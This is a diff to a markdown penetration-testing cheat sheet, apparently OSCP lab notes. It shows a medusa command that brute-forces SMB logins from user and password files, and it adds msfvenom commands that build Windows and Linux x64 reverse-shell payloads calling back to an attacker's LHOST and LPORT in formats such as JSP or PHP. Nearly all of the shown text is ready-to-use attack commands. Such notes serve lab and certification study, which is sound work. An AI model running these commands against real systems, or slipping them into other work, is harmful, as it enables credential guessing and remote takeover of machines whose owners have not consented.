@@ -13,9 +13,17 @@ Enumerate if any user has info:
 **SMB USER/CHECK**
 
     medusa -M smbnt -h <ip> -U userfile -P passfile -m GROUP:DOMAIN -v 4	
-## Windows Payloads
-    
+## MSFVenom Payloads
+**Windows Payload**
+Change x64 if you are facing a x86 box:
+
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<PORT> -f <format; example: jsp, php..> > file.<format>
+    
+**Linux Payload**
+Change x64 if you are facing a x86 box:
+
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<PORT> -f <format; example: jsp, php..> > file.<format>
+
 ## Kernel Cross-Compiling
 
 Really helpful if you are facing an old-school 32-bit box (believe me, there's tons of them in OSCP Labs xd)
